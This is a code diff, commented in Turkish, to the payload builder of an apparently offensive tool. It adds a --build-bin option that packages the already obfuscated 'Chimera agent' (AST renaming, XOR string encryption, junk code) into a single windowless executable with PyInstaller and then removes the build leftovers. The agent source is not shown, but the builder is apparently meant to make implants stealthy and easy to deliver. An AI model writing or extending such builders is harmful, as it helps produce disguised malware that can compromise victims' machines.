@@ -27,6 +27,8 @@ import time
 import re
 import ipaddress
 import argparse
+import subprocess
+import shutil
 from datetime import datetime
 
 # Obfuscator kütüphanesini içe aktarmaya çalış
@@ -169,6 +171,7 @@ def build_payload(
     agent_source_path: str = None,
     strip_comments: bool = False,
     obfuscate: bool = False,
+    build_bin: bool = False,
     quiet: bool = False
 ) -> dict:
     """Chimera agent payload'ını oluşturur.
@@ -186,6 +189,7 @@ def build_payload(
         agent_source_path:  Agent kaynak dosyası yolu (None ise otomatik bulur).
         strip_comments:     Yorum satırlarını kaldır.
         obfuscate:          AST rename + XOR string encrypt + junk code uygula.
+        build_bin:          PyInstaller kullanarak çalıştırılabilir ikili (binary) dosyasına dönüştür.
         quiet:              Ekrana çıktı basma.
 
     Returns:
@@ -356,10 +360,18 @@ def build_payload(
                 if not quiet:
                     print(f"[!] Obfuscation başarısız: {obf_result['error']}")
 
-    # --- Dosyaya yaz ---
+    # --- Dosyaya yaz ve İkili Derleme (Build) ---
+    if build_bin and not output_path:
+        result["error"] = "[!] Derleme işlemi için OUTPUT belirtilmek zorundadır."
+        result["success"] = False
+        return result
+
     if output_path:
-        if not output_path.endswith(".py"):
-            output_path += ".py"
+        py_path = output_path
+        if not py_path.endswith(".py") and not build_bin:
+            py_path += ".py"
+        elif build_bin:
+            py_path = output_path + ".py" if not output_path.endswith(".py") else output_path
 
         # Çıktı dizinini oluştur
         output_dir = os.path.dirname(output_path)
@@ -372,16 +384,83 @@ def build_payload(
                 return result
 
         try:
-            with open(output_path, "w", encoding="utf-8") as f:
+            with open(py_path, "w", encoding="utf-8") as f:
                 f.write(agent_code)
             # Çalıştırılabilir yap (Unix)
             if sys.platform != "win32":
-                os.chmod(output_path, 0o755)
-            result["output_path"] = os.path.abspath(output_path)
+                os.chmod(py_path, 0o755)
+            result["output_path"] = os.path.abspath(py_path)
         except Exception as e:
             result["error"] = f"[!] Dosya yazma hatası: {e}"
             result["success"] = False
             return result
+
+        if build_bin:
+            if not quiet:
+                print("[*] PyInstaller ile yürütülebilir dosyaya dönüştürülüyor (bu işlem biraz vakit alabilir)...")
+            try:
+                exe_out_dir = os.path.dirname(os.path.abspath(result["output_path"]))
+                pyinstaller_cmd = [
+                    sys.executable, "-m", "PyInstaller",
+                    "--onefile",
+                    "--noconsole",
+                    "--noconfirm",
+                    "--distpath", exe_out_dir,
+                    os.path.abspath(py_path)
+                ]
+                
+                process = subprocess.run(
+                    pyinstaller_cmd,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True
+                )
+                
+                if process.returncode != 0:
+                    result["error"] = f"[!] Derleme hatası: PyInstaller başarısız oldu.\nAyrıntılı Hata:\n{process.stderr}"
+                    result["success"] = False
+                    return result
+                    
+                # PyInstaller başarılı, derlenen dosyayı bul
+                base_name = os.path.splitext(os.path.basename(py_path))[0]
+                # PyInstaller genellikle .exe üretir (Win/Linux farketmeksizin PE olarak hedeflenmişse vs ama aslında linux'ta uzantısız ELF çıkarır).
+                expected_out_name = base_name + (".exe" if sys.platform == "win32" else "")
+                expected_out_path = os.path.join(exe_out_dir, expected_out_name)
+                
+                # Eğer output_path belirli bir isimse ve expected_out_path ondan farklıysa
+                final_output = output_path
+                if sys.platform == "win32" and not final_output.endswith(".exe"):
+                    final_output += ".exe"
+                    
+                # Eğer farklıysa taşı
+                if os.path.exists(expected_out_path) and os.path.abspath(expected_out_path) != os.path.abspath(final_output):
+                    shutil.move(expected_out_path, final_output)
+                elif not os.path.exists(expected_out_path) and not sys.platform == "win32":
+                    # Linux için Pyinstaller uzantısız üretmiş olabilir
+                    if os.path.exists(os.path.join(exe_out_dir, base_name)) and os.path.abspath(os.path.join(exe_out_dir, base_name)) != os.path.abspath(final_output):
+                       shutil.move(os.path.join(exe_out_dir, base_name), final_output) 
+                       expected_out_path = os.path.join(exe_out_dir, base_name)
+                
+                if os.path.exists(final_output):
+                    result["output_path"] = os.path.abspath(final_output)
+                elif os.path.exists(expected_out_path):
+                    result["output_path"] = os.path.abspath(expected_out_path)
+
+                result["stats"]["build_bin"] = True
+                result["stats"]["final_size"] = os.path.getsize(result["output_path"])
+                
+                # PyInstaller kalıntılarını temizle
+                spec_file = os.path.join(os.getcwd(), base_name + ".spec")
+                build_dir = os.path.join(os.getcwd(), "build", base_name)
+                if os.path.exists(spec_file):
+                    os.remove(spec_file)
+                if os.path.exists(build_dir):
+                    shutil.rmtree(build_dir)
+                    
+            except Exception as e:
+                result["error"] = f"[!] Derleme sırasında beklenmedik sistem hatası: {e}"
+                result["success"] = False
+                return result
 
     return result
 
@@ -430,6 +509,10 @@ def print_build_report(result: dict):
     obf_flag = stats.get('obfuscated', False)
     obf_str = "✅ Evet" if obf_flag else "Hayır"
     print(f"  ║  ├─ Obfuscation     : {obf_str:<35}║")
+
+    bin_flag = stats.get('build_bin', False)
+    bin_str = "✅ Evet" if bin_flag else "Hayır"
+    print(f"  ║  ├─ İkili Derleme   : {bin_str:<35}║")
 
     print(f"  ╠{border}╣")
     print(f"  ║  🔐 Hash Değerleri                                      ║")
@@ -506,6 +589,10 @@ def main():
         help="AST rename + XOR string şifreleme + junk code uygula."
     )
     parser.add_argument(
+        "--build-bin", action="store_true",
+        help="PyInstaller kullanarak çalıştırılabilir ikili dosyaya (binary) dönüştür."
+    )
+    parser.add_argument(
         "-q", "--quiet", action="store_true",
         help="Sadece hata/başarı mesajı göster, detaylı rapor gösterme."
     )
@@ -521,6 +608,7 @@ def main():
         agent_source_path=args.agent_source,
         strip_comments=args.strip_comments,
         obfuscate=args.obfuscate,
+        build_bin=args.build_bin,
         quiet=args.quiet,
     )
 
